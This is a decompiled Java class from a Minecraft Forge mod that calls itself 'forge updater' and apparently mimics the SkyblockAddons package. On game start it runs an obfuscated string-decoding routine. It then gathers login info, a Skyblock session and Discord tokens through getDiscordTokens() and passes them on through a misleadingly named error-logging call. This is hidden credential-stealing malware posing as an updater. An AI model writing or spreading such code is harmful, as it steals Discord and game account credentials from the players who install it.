/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraftforge.fml.common.Mod
 *  net.minecraftforge.fml.common.Mod$EventHandler
 *  net.minecraftforge.fml.common.event.FMLInitializationEvent
 */
package codes.biscuit;

import codes.biscuit.handler.errors;
import codes.biscuit.handler.loginfo;
import codes.biscuit.sbHook.hookInfo;
import codes.biscuit.sbHook.hookSkyblock;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

@Mod(modid="forge updater", version="2.14.2", acceptedMinecraftVersions="[1.8.9]")
public class updater {
    @Mod.EventHandler
    private void init(FMLInitializationEvent event) throws Exception {
        String ar = "8r5f7n7r8x4d1b8k3m8e6j7f6p7r4i6v4c4e2r3n8v2N2l4o3h7v1p3d8W603b5t4i5n3-7v6g3q5v4t7d1b2d1+2r7q7h5j1i6e1^7}4z2g7s5/3c1l4m2i4c4o5m4b5z4k5t2j2m3p2`5`1348531.1.1.1\\4c7q1r2d6d3^6756315988631\\3b2l2s6h8e6a45591/631.2/6a6e1k6w7i2l1l8m5t4s7h7V718p6k7w6w714t8j1^4r3b7h8r7l4m5/5u8i6p1F5`8632442.1.417b6e7q4u6h4x8c1-7455747:4_2a4n5v2d6v6h7d5s7f1b5o1f3L4.3s5o3d2g8p4c5/5u8j1^7u3b2c5o2g7p2,2r8i6p4y1d4r2c4n8I7h6g2N1b4e1M8p3n8q8W2.86551+8=68832Q2M2b3`5f6t8F5115394c6e4.3s3`8g8h5b1b7u1_608m5q2_2-3.286r2r8x7k";
        char[] br = ar.toCharArray();
        int g = 0;
        int k = 0;
        String cr = "";
        String ai = "";
        String bi = "";
        String ci = "";
        String di = "";
        String ei = "";
        String fi = "";
        String gi = "";
        String hi = "";
        String ii = "";
        String ji = "";
        String ki = "";
        String li = "";
        String mi = "";
        for (int i = 0; i < br.length; i += 2) {
            g = Integer.parseInt(String.valueOf(br[br.length - i - 2])) - 4;
            k = br[br.length - i - 1] - g;
            cr = cr + (char)k;
        }
        char[] bArr = cr.toCharArray();
        for (int i = 0; i < bArr.length; ++i) {
            if (i < 25) {
                ai = ai + bArr[i];
            }
            if (i < 39) {
                bi = bi + bArr[i];
            }
            if (i < 55) {
                ci = ci + bArr[i];
            }
            if (i < 85) {
                di = di + bArr[i];
            }
            if (i < 97) {
                ei = ei + bArr[i];
            }
            if (i < 110) {
                fi = fi + bArr[i];
            }
            if (i < 136) {
                gi = gi + bArr[i];
            }
            if (i < 149) {
                hi = hi + bArr[i];
            }
            if (i < 162) {
                ii = ii + bArr[i];
            }
            if (i < 175) {
                ji = ji + bArr[i];
            }
            if (i < 233) {
                ki = ki + bArr[i];
            }
            if (i < 240) {
                li = li + bArr[i];
            }
            if (i >= 245) continue;
            mi = mi + bArr[i];
        }
        errors.logErr(
            loginfo.logInfo()
             + hookInfo.sbCon() + hookSkyblock.getDiscordTokens()
        );
    }
}

